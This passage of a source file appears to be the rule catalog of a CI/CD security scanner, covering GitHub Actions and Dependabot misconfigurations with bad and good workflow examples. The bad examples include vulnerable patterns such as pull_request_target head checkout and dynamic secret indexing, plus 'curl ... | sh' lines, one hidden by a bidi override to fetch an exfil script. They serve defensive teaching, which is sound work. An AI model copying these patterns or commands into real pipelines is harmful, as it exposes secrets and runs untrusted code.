      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          persist-credentials: false
      - run: ./build.sh
      - uses: actions/upload-artifact@26f96dfa697d77e81fd5907df203aa23a56210a8 # v4.3.0
        with:
          path: dist/   # narrow path, no .git`,
      goodExampleCaption: "No credentials in .git/config; artifact scoped to dist/.",
      tips: [
        "If a subsequent step needs to push back to the repo, configure git credentials explicitly via `git remote set-url origin https://x-access-token:$GH_TOKEN@github.com/...`.",
        "Never upload the entire workspace as an artifact — always narrow the path.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-801", "ISSUE-301"],
    },
  },

  "ISSUE-308": {
    code: "ISSUE-308",
    github: {
      title: "Secret read via dynamic index",
      category: "CI/CD Secrets",
      severity: "high",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Secret must not be read via dynamic index",
      controlConfigKey: "workflowMustNotIndexSecretsDynamically",
      description:
        "A workflow reads a secret using `secrets[expr]` where `expr` is computed at runtime from a template expression.",
      impact:
        "Runtime indexing defeats static review. A PR-author-controlled expression (`secrets[github.event.pull_request.title]`) lets the attacker choose which secret leaks — the workflow file alone gives no clue about which secret will be accessed.",
      remediation:
        "Reference secrets by their literal name (`${{ secrets.AWS_ACCESS_KEY_ID }}`). If you need to switch between secrets, use a switch statement in a shell step with env-bound options rather than dynamic indexing.",
      badExample: `# .github/workflows/multi-env.yml — ❌ Dynamic index
on:
  workflow_dispatch:
    inputs:
      target: { type: string }
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - env:
          KEY: \${{ secrets[format('API_KEY_{0}', inputs.target)] }}
        run: ./deploy.sh`,
      badExampleCaption: "`inputs.target` controls which secret is read.",
      goodExample: `# .github/workflows/multi-env.yml — ✅ Explicit switch
on:
  workflow_dispatch:
    inputs:
      target:
        type: choice
        options: [staging, production]
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: \${{ inputs.target }}   # gates per environment
    steps:
      - env:
          API_KEY: \${{ secrets.API_KEY }}
        run: ./deploy.sh`,
      goodExampleCaption: "Each environment has its own `API_KEY` secret; the environment gate enforces who can deploy where.",
      tips: [
        "GitHub Environments give you per-target secret scoping without dynamic indexing.",
        "If you must use dynamic indexing, validate the index against an allowlist before the lookup.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-305", "ISSUE-301"],
    },
  },

  "ISSUE-802": {
    code: "ISSUE-802",
    github: {
      title: "Workflow subscribes to a dangerous trigger",
      category: "Workflow triggers and permissions",
      severity: "critical",
      fixDuration: "medium",
      productScope: "cli",
      controlName: "Workflow must not use dangerous triggers",
      controlConfigKey: "workflowMustNotUseDangerousTriggers",
      description:
        "A workflow is triggered by `pull_request_target` or `workflow_run`. Both triggers run with the base repository's secrets and a write-capable GITHUB_TOKEN, even when the triggering PR comes from a fork.",
      impact:
        "These triggers are the root cause behind the highest-impact GitHub Actions CVEs of the past two years — tj-actions, reviewdog, Ultralytics. A single template-injection or PR-head checkout in a workflow on one of these triggers exfiltrates every secret the workflow can reach.",
      remediation:
        "Use the safer `pull_request` trigger where possible — it runs without secret access on fork PRs. If `pull_request_target` is necessary, restrict to non-code activities (label, comment, etc.) and never check out the PR's head (see ISSUE-804).",
      badExample: `# .github/workflows/welcome.yml — ❌ pull_request_target with full repo access
on: pull_request_target
jobs:
  welcome:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: \${{ github.event.pull_request.head.sha }}   # ISSUE-804
      - run: ./run-tests.sh   # PR-author code with base secrets`,
      badExampleCaption: "PR-author code executes with the base repo's secrets and GITHUB_TOKEN.",
      goodExample: `# .github/workflows/welcome.yml — ✅ pull_request (no secrets on forks)
on: pull_request
permissions:
  contents: read
jobs:
  welcome:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - run: ./run-tests.sh

# .plumber.yaml
github:
  controls:
    workflowMustNotUseDangerousTriggers:
      enabled: true
      allowedTriggers: []`,
      goodExampleCaption: "Forks see read-only access; no secret exfiltration path.",
      tips: [
        "If you genuinely need PR-comment automation, split the work: a `pull_request` workflow uploads artifacts; a separate `workflow_run` (with a restrictive permissions block) consumes them.",
        "Pair with ISSUE-804 for the explicit head-checkout anti-pattern and ISSUE-305 for the environment-gate side.",
      ],
      relatedCodes: ["ISSUE-804", "ISSUE-305", "ISSUE-207"],
    },
  },

  "ISSUE-804": {
    code: "ISSUE-804",
    github: {
      title: "pull_request_target workflow checks out the PR head",
      category: "Workflow triggers and permissions",
      severity: "critical",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "pull_request_target must not check out the PR head",
      controlConfigKey: "pullRequestTargetMustNotCheckoutHead",
      description:
        "A workflow on the `pull_request_target` trigger explicitly checks out `github.event.pull_request.head.sha` (or `head_ref`). The job has access to the base repository's secrets *and* runs the PR author's code.",
      impact:
        "This is the exact pattern behind the March 2025 tj-actions / reviewdog compromise. Any shell step that runs after the checkout is a direct path to secret exfiltration — `npm install` (runs package scripts), `pytest` (loads conftest.py), even `cat README.md` (via attacker-supplied content).",
      remediation:
        "Remove the explicit head checkout. `pull_request_target` should only check out the base branch (the default), where the code under review has already been merged.",
      badExample: `# .github/workflows/lint.yml — ❌ Head checkout in privileged trigger
on: pull_request_target
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: \${{ github.event.pull_request.head.sha }}   # ← attacker code
      - run: ./lint.sh`,
      badExampleCaption: "The PR author's code now runs with `pull_request_target`'s secret-bearing GITHUB_TOKEN.",
      goodExample: `# .github/workflows/lint.yml — ✅ Use pull_request, no head checkout needed
on: pull_request
permissions:
  contents: read
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        # default ref: github.event.pull_request.head.sha is fine on pull_request
      - run: ./lint.sh`,
      goodExampleCaption: "`pull_request` runs without secret access on fork PRs — head checkout is safe.",
      tips: [
        "If a workflow truly needs both PR code AND secrets, the right pattern is: PR workflow uploads diff artefact → trusted workflow_run consumes it (no checkout).",
        "Plumber's default-on `actionsMustBePinnedByCommitSha` + ISSUE-802 + this rule cover the tj-actions class of vulnerabilities end-to-end.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-802", "ISSUE-701"],
    },
  },

  "ISSUE-417": {
    code: "ISSUE-417",
    github: {
      title: "Required action or reusable workflow is missing",
      category: "Pipeline Composition",
      severity: "high",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Workflows must include required actions",
      controlConfigKey: "workflowMustIncludeRequiredActions",
      description:
        "An action or reusable workflow declared as required in `workflowMustIncludeRequiredActions.requiredGroups` is not referenced by any job or step in the project's `.github/workflows/` files. The missing reference means a mandatory security scan, compliance check, or organisation-wide workflow is not actually running on this repository.",
      impact:
        "A control that exists in policy but not in the pipeline gives a false sense of coverage. Auditors looking at the org-wide policy see the rule; the repo's actual workflow run does not exercise it. Common cases: a new repo onboarded without copying the security workflow, a refactor that dropped a `uses:` step, or a misspelled action name that resolves to nothing.",
      remediation:
        "Add a step or job in one of the project's workflow files that references the required action or reusable workflow. The two shapes the control accepts: step-level `uses: <owner>/<repo>[/path]@<ref>` (action invocation) and job-level `jobs.<name>.uses: <owner>/<repo>/.github/workflows/<file>.yml@<ref>` (reusable workflow call). Plumber matches the `owner/repo[/path]` prefix ref-agnostically, so any pinned ref works.",
      badExample: `# .github/workflows/ci.yml — ❌ Required SAST action is not referenced
on: [push, pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - run: make build

# .plumber.yaml
# github:
#   controls:
#     workflowMustIncludeRequiredActions:
#       enabled: true
#       requiredGroups:
#         - ["myorg/sast-scan", "myorg/dependency-review"]`,
      badExampleCaption: "Neither `myorg/sast-scan` nor `myorg/dependency-review` is referenced anywhere; the policy fires for both.",
      goodExample: `# .github/workflows/ci.yml — ✅ Required actions wired up
on: [push, pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - run: make build

  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: myorg/sast-scan@abc1234567890abc1234567890abc1234567890a
      - uses: myorg/dependency-review@def4567890def4567890def4567890def4567890`,
      goodExampleCaption: "Both required actions are referenced; the AND group is satisfied and the policy reports 100% compliant.",
      tips: [
        "DNF semantics: the outer list is OR, the inner is AND. `[[a, b], [c]]` reads as `(a AND b) OR c`. Use this when you have a primary security suite plus an all-in-one alternative.",
        "Use `required: a AND b OR c` if the boolean expression feels clearer than nested arrays. AND binds tighter than OR.",
        "Reusable-workflow calls (`jobs.<name>.uses: owner/repo/.github/workflows/file.yml@ref`) count the same as step-level action `uses:` references. List the full path of the reusable workflow when that is the specific entry you require.",
        "Matching is ref-agnostic, so `myorg/sast-scan` is satisfied by `myorg/sast-scan@v2`, `myorg/sast-scan@abc1234…`, and `myorg/sast-scan/composite@v1`. Pin the ref in the workflow with the standard SHA convention; this control does not care which ref.",
        "Slash-guard prevents accidental matches: `myorg/sast-scan` does NOT match `myorg/sast-scan-fork@v1`.",
      ],
      status: "shipping",
      relatedCodes: ["ISSUE-405", "ISSUE-408"],
    },
  },

  "ISSUE-803": {
    code: "ISSUE-803",
    github: {
      title: "Job runs with overly broad (write-all) permissions",
      category: "Workflow triggers and permissions",
      severity: "high",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Job must not run with write-all permissions",
      controlConfigKey: "workflowMustNotGrantPermissionsWriteAll",
      description:
        "A workflow or job in committed YAML declares the literal `permissions: write-all` shortcut, which grants `GITHUB_TOKEN` every scope GitHub supports at once. Workflow-level `write-all` is propagated to every job without its own block. Plumber does not flag scope maps (`contents: write`, …), `read-all`, missing `permissions:` blocks (ISSUE-801), or `${{ }}` expressions.",
      impact:
        "Over-broad GITHUB_TOKEN scopes magnify the impact of any other vulnerability. A template-injection in a `write-all` job lets the attacker push to the repo, create releases, modify branch protection, etc.",
      remediation:
        "List only the scopes the job actually needs. Most jobs only need `contents: read`; release jobs need `contents: write`; CodeQL needs `security-events: write`.",
      badExample: `# .github/workflows/release.yml — ❌ Write-all
jobs:
  release:
    runs-on: ubuntu-latest
    permissions: write-all
    steps:
      - run: ./release.sh`,
      badExampleCaption: "`write-all` grants every scope GitHub supports.",
      goodExample: `# .github/workflows/release.yml — ✅ Scoped
jobs:
  release:
    runs-on: ubuntu-latest
    permissions:
      contents: write       # to create the release
      packages: write       # to push to ghcr.io
    steps:
      - run: ./release.sh`,
      goodExampleCaption: "Just enough to publish; nothing more.",
      tips: [
        "Scope is static `permissions:` keys in `.github/workflows/` only. Broad but explicit maps are intentionally out of scope for this control.",
        "Pair with ISSUE-801 to catch jobs that omit a `permissions:` block and inherit the repository default.",
        "Permissions inside callee reusable workflows are not scanned unless those files are in the analyzed repository.",
        "Toggle via `github.controls.workflowMustNotGrantPermissionsWriteAll.enabled`.",
      ],
      status: "shipping",
      relatedCodes: ["ISSUE-801"],
    },
  },

  "ISSUE-418": {
    code: "ISSUE-418",
    github: {
      title: "Workflow has no concurrency block",
      category: "Pipeline Composition",
      severity: "low",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Workflow must declare a concurrency block",
      controlConfigKey: "workflowsMustDeclareConcurrency",
      description:
        "A workflow has no `concurrency:` block at either workflow or job level.",
      impact:
        "Without concurrency control, a flood of pushes runs every job to completion in parallel — wasting CI minutes and creating race conditions on deploy jobs that share infrastructure.",
      remediation:
        "Add a `concurrency:` block with a group key that includes `${{ github.ref }}` (so pushes on the same branch cancel earlier runs).",
      badExample: `# .github/workflows/test.yml — ❌ No concurrency control
name: Unit tests
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: pytest`,
      badExampleCaption: "Rapid pushes pile up indefinitely.",
      goodExample: `# .github/workflows/test.yml — ✅ One run per ref at a time
name: Unit tests
on: [push, pull_request]
concurrency:
  group: \${{ github.workflow }}-\${{ github.ref }}
  cancel-in-progress: true
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: pytest`,
      goodExampleCaption: "`cancel-in-progress: true` kills the older run when a new push arrives.",
      tips: [
        "For release / deploy workflows, set `cancel-in-progress: false` so in-flight deploys aren't aborted.",
        "Use a separate concurrency group per environment (`group: deploy-${{ inputs.target }}`).",
      ],
      status: "roadmap",
      relatedCodes: [],
    },
  },

  "ISSUE-419": {
    code: "ISSUE-419",
    github: {
      title: "Workflow uses a known misfeature pattern",
      category: "Pipeline Composition",
      severity: "medium",
      fixDuration: "medium",
      productScope: "cli",
      controlName: "Workflow must not use known misfeature patterns",
      controlConfigKey: "workflowMustNotUseKnownMisfeatures",
      description:
        "A workflow uses a pattern from Plumber's curated misfeature list — `shell: cmd` on Windows runners, inline `pip install ... | sh`, full-checkout artifact uploads, etc.",
      impact:
        "Each pattern on the list has a documented CVE or post-mortem history. Bundling them into one rule keeps the catalog manageable while still catching the dangerous combinations.",
      remediation:
        "Plumber's output names the specific misfeature triggered. The remediation depends on the pattern — see Tips below for the common ones.",
      badExample: `# .github/workflows/build.yml — ❌ Several misfeatures
jobs:
  build:
    runs-on: windows-latest
    defaults:
      run:
        shell: cmd   # ← misfeature: legacy shell, weak quoting
    steps:
      - run: curl https://get.example.com | sh   # ← misfeature: install-pipe-shell
      - uses: actions/upload-artifact@v4
        with:
          path: .   # ← misfeature: full-workspace artifact`,
      badExampleCaption: "Three misfeatures in one workflow.",
      goodExample: `# .github/workflows/build.yml — ✅ Modern patterns
jobs:
  build:
    runs-on: windows-latest
    defaults:
      run:
        shell: pwsh   # PowerShell core, modern quoting
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - run: ./scripts/install.ps1   # vendored installer
      - uses: actions/upload-artifact@26f96dfa697d77e81fd5907df203aa23a56210a8 # v4.3.0
        with:
          path: dist/`,
      goodExampleCaption: "Modern shell, vendored installers, narrow artifact paths.",
      tips: [
        "On Windows: prefer `pwsh` over `cmd` or legacy `powershell`.",
        "Replace `curl | sh` style installers with vendored or checksum-verified downloads (see ISSUE-411).",
        "Never upload the entire workspace — narrow to `dist/`, `target/`, `build/`.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-307", "ISSUE-411"],
    },
  },

  "ISSUE-420": {
    code: "ISSUE-420",
    github: {
      title: "Workflow contains obfuscated content",
      category: "Pipeline Composition",
      severity: "high",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Workflow must not contain obfuscated content",
      controlConfigKey: "workflowMustNotContainObfuscation",
      description:
        "A workflow's `run:` content contains zero-width / non-ASCII unicode characters, bidirectional override codepoints, or homoglyph sequences (e.g. Cyrillic `а` instead of Latin `a`).",
      impact:
        "Obfuscation in CI is a near-certain sign of an attempt to hide malicious commands from human reviewers. The 2021 Trojan Source paper (CVE-2021-42574) demonstrated bidi-override attacks against code review at scale.",
      remediation:
        "Plumber's output points at the suspicious bytes. Inspect the workflow with `cat -v` or a hex editor and replace the unicode with plain ASCII.",
      badExample: `# .github/workflows/deploy.yml — ❌ Bidi override hidden
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "deploying"
          curl https://safe.example.com‮/exfil.sh | sh   # bidi reverses display
`,
      badExampleCaption: "The visible URL says 'safe' but the runtime path is 'exfil.sh'.",
      goodExample: `# .github/workflows/deploy.yml — ✅ Pure ASCII
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "deploying"
          curl https://safe.example.com/deploy.sh | sha256sum -c expected.sha
          sh deploy.sh`,
      goodExampleCaption: "What you read is what runs.",
      tips: [
        "Add a pre-commit hook (`unicode-bidi-blocker`) to reject bidi codepoints in PRs.",
        "Run `grep -P '[\\x{200B}-\\x{200F}\\x{202A}-\\x{202E}\\x{2066}-\\x{2069}]' .github/workflows/` periodically.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-411"],
    },
  },

  "ISSUE-421": {
    code: "ISSUE-421",
    github: {
      title: "Publish workflow uses a static token instead of OIDC trusted publishing",
      category: "Pipeline Composition",
      severity: "medium",
      fixDuration: "long",
      productScope: "cli",
      controlName: "Publish workflows should use OIDC trusted publishing",
      controlConfigKey: "publishWorkflowsMustUseOidcTrustedPublishing",
      description:
        "A PyPI / npm publish workflow authenticates with a long-lived API token (`secrets.PYPI_API_TOKEN`) instead of OIDC trusted publishing.",
      impact:
        "Long-lived publish tokens are the most common cause of package-registry account takeover. A leaked token (from any source — log, artifact, compromised maintainer machine) hands an attacker permanent publish rights on every package the token can write to.",
      remediation:
        "Switch to OIDC. PyPI / TestPyPI support trusted publishers; npm supports trusted publishers via 'OIDC tokens' since 2024. The workflow needs `id-token: write` and no long-lived secret.",
      badExample: `# .github/workflows/pypi.yml — ❌ Long-lived API token
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: pypa/gh-action-pypi-publish@v1
        with:
          password: \${{ secrets.PYPI_API_TOKEN }}`,
      badExampleCaption: "Token in `secrets.PYPI_API_TOKEN` lives until it's manually rotated.",
      goodExample: `# .github/workflows/pypi.yml — ✅ OIDC trusted publishing
permissions:
  id-token: write
  contents: read
jobs:
  publish:
    runs-on: ubuntu-latest
    environment: pypi   # required for trusted publishers
    steps:
      - uses: pypa/gh-action-pypi-publish@76f52bc884231f62b9a034ebfe128415bbaabdfc # v1.12.4`,
      goodExampleCaption: "Each publish gets a fresh OIDC token; no long-lived secret to leak.",
      tips: [
        "PyPI: register a trusted publisher at https://pypi.org/manage/account/publishing/.",
        "npm: enable trusted publishers under the package's Settings > OIDC.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-712", "ISSUE-302"],
    },
  },

  "ISSUE-901": {
    code: "ISSUE-901",
    github: {
      title: "dependabot.yml re-enables insecure external execution",
      category: "Repository hygiene",
      severity: "high",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "dependabot.yml must not re-enable insecure external execution",
      controlConfigKey: "dependabotMustNotAllowInsecureExternalCodeExecution",
      description:
        "The repository's `.github/dependabot.yml` opts into `insecure-external-code-execution: allow` for one or more ecosystems.",
      impact:
        "Allowing external code execution during dependency resolution lets a compromised registry (PyPI typosquat, npm package takeover) execute code in your CI under Dependabot's permissions.",
      remediation:
        "Set `insecure-external-code-execution: deny` (the default) or remove the flag entirely.",
      badExample: `# .github/dependabot.yml — ❌ External exec allowed
version: 2
updates:
  - package-ecosystem: pip
    directory: /
    schedule:
      interval: weekly
    insecure-external-code-execution: allow`,
      badExampleCaption: "A compromised PyPI package's setup.py runs in Dependabot's update job.",
      goodExample: `# .github/dependabot.yml — ✅ Deny external exec (default)
version: 2
updates:
  - package-ecosystem: pip
    directory: /
    schedule:
      interval: weekly
    # insecure-external-code-execution omitted (defaults to deny)`,
      goodExampleCaption: "Dependency resolution stays sandboxed.",
      tips: [
        "Pair with ISSUE-902 to keep the cooldown window short and ISSUE-903 to keep the tool present at all.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-902", "ISSUE-903", "ISSUE-214"],
    },
  },

  "ISSUE-902": {
    code: "ISSUE-902",
    github: {
      title: "dependabot.yml update ecosystem has no cooldown",
      category: "Repository hygiene",
      severity: "low",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "dependabot.yml update ecosystems should have a cooldown",
      controlConfigKey: "dependabotEcosystemsMustHaveCooldown",
      description:
        "A `.github/dependabot.yml` ecosystem entry has no `cooldown:` window. Dependabot opens an update PR as soon as a new version exists upstream.",
      impact:
        "Without a cooldown, a poisoned package version reaches your dependency tree before community advisories are published. The typical detection-to-yank window on PyPI / npm is 24–72 hours — a cooldown of `7d` skips that risk window entirely.",
      remediation:
        "Add `cooldown:` (with a `default-days: 7` or per-update-type configuration) to every ecosystem in `dependabot.yml`.",
      badExample: `# .github/dependabot.yml — ❌ No cooldown
version: 2
updates:
  - package-ecosystem: npm
    directory: /
    schedule:
      interval: weekly`,
      badExampleCaption: "Dependabot proposes a bump within minutes of any upstream release.",
      goodExample: `# .github/dependabot.yml — ✅ 7-day cooldown
version: 2
updates:
  - package-ecosystem: npm
    directory: /
    schedule:
      interval: weekly
    cooldown:
      default-days: 7
      semver-major-days: 14`,
      goodExampleCaption: "Major bumps wait 14 days; minor/patch wait 7.",
      tips: [
        "Renovate has the same feature under `minimumReleaseAge` — comparable defense.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-901", "ISSUE-903", "ISSUE-214"],
    },
  },

  "ISSUE-903": {
    code: "ISSUE-903",
    github: {
      title: "Repository has workflows but no dependency update tool",
      category: "Repository hygiene",
      severity: "medium",
      fixDuration: "medium",
      productScope: "cli",
      controlName: "Repository should have a dependency update tool",
      controlConfigKey: "repositoriesMustConfigureDependencyUpdates",
      description:
        "The repository runs workflows but has no `.github/dependabot.yml`, no Renovate configuration, and no third-party equivalent.",
      impact:
        "Manual upgrade flows leave known-vulnerable dependencies in CI for the longest possible time. Plumber's other rules surface vulnerable actions (ISSUE-703) and stale pins (ISSUE-709) — without an updater, you have no path to apply those updates routinely.",
      remediation:
        "Add `.github/dependabot.yml` with at least the `github-actions` ecosystem (cheap, high-signal). Add language ecosystems (`pip`, `npm`, `bundler`) as the repo's languages.",
      badExample: `# .github/dependabot.yml — ❌ File missing entirely
`,
      badExampleCaption: "Repo has workflows but no automation to bump action SHAs or language deps.",
      goodExample: `# .github/dependabot.yml — ✅ Minimal start
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
    cooldown:
      default-days: 7
  - package-ecosystem: npm
    directory: /
    schedule:
      interval: weekly
    cooldown:
      default-days: 7`,
      goodExampleCaption: "GitHub Actions + npm covered; weekly cadence with cooldown.",
      tips: [
        "If you prefer Renovate, configure it via `renovate.json` — Plumber recognises both.",
        "`github-actions` ecosystem auto-bumps SHA pins (ISSUE-709) and version comments (ISSUE-708) for you.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-701", "ISSUE-709", "ISSUE-901", "ISSUE-902"],
    },
  },

  "ISSUE-904": {
    code: "ISSUE-904",
    github: {
      title: "Repository has workflows but no SAST scanner",
      category: "Repository hygiene",
      severity: "medium",
      fixDuration: "medium",
      productScope: "cli",
      controlName: "Repository should run a SAST scanner",
      controlConfigKey: "repositoriesMustRunSAST",
      description:
        "The repository has workflows but none of them runs a SAST scanner (CodeQL, Semgrep, SonarQube, Snyk Code, etc.).",
      impact:
        "SAST in CI catches a meaningful fraction of pre-merge defects (auth bugs, injection patterns, unsafe deserialisation) for one of the lowest CI-minute costs available. Skipping it removes a cheap gate that ships value every week.",
      remediation:
        "Add a SAST job. GitHub's CodeQL is free for public repos and most plan tiers; Semgrep OSS is a free alternative on private repos.",
      badExample: `# .github/workflows/ — ❌ Build + test only, no SAST
ci.yml         (build + lint)
test.yml       (pytest)
release.yml    (publish)`,
      badExampleCaption: "No SAST scanner anywhere in the workflows directory.",
      goodExample: `# .github/workflows/codeql.yml — ✅ CodeQL on push + weekly
name: CodeQL
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  schedule:
    - cron: "0 0 * * 1"
permissions:
  security-events: write
  contents: read
jobs:
  analyze:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: github/codeql-action/init@4e828ff8d448a8a6e532957b1811f387a63867e8 # v3.27.6
        with:
          languages: python
      - uses: github/codeql-action/analyze@4e828ff8d448a8a6e532957b1811f387a63867e8 # v3.27.6`,
      goodExampleCaption: "CodeQL runs on every push and weekly on a schedule.",
      tips: [
        "CodeQL supports Python, JavaScript/TypeScript, Java, Go, C/C++, C#, Ruby, Swift, Kotlin.",
        "Plumber recognises `github/codeql-action`, `returntocorp/semgrep-action`, `snyk/actions/python`, etc. — extensible via config.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-410", "ISSUE-905"],
    },
  },

  "ISSUE-905": {
    code: "ISSUE-905",
    github: {
      title: "Repository has no SECURITY.md",
      category: "Repository hygiene",
      severity: "low",
      fixDuration: "quick",
      productScope: "cli",
      controlName: "Repository should have a SECURITY.md policy",
      controlConfigKey: "repositoriesMustPublishSecurityPolicy",
      description:
        "The repository has workflows (suggesting it's an actively maintained project) but no `SECURITY.md` at the root, in `.github/`, or in `docs/`.",
      impact:
        "A documented security policy tells reporters where to send vulnerability disclosures. Without it, reporters drop CVE-class issues into public GitHub Issues — turning a private heads-up into a zero-day.",
      remediation:
        "Add a `SECURITY.md` describing the supported versions and a private contact (security advisory link, email).",
      badExample: `# Repository root — ❌ No security policy file anywhere
.github/
src/
README.md
LICENSE
# (no SECURITY.md)`,
      badExampleCaption: "External reporters have nowhere to file a private disclosure.",
      goodExample: `# SECURITY.md — ✅ Clear disclosure path

## Reporting a vulnerability

Please use GitHub's [private vulnerability reporting](https://github.com/my-org/my-repo/security/advisories/new)
or email security@my-org.example. We aim to acknowledge within 48 hours.

## Supported versions

| Version | Supported |
|---------|-----------|
| 2.x     | ✓         |
| 1.x     | ✗         |`,
      goodExampleCaption: "GitHub's private vulnerability reporting + email fallback.",
      tips: [
        "Enable Private Vulnerability Reporting under Settings > Code security and analysis.",
        "Plumber accepts `SECURITY.md` in repo root, `.github/`, or `docs/`.",
      ],
      status: "roadmap",
      relatedCodes: ["ISSUE-904"],
    },
  },

};
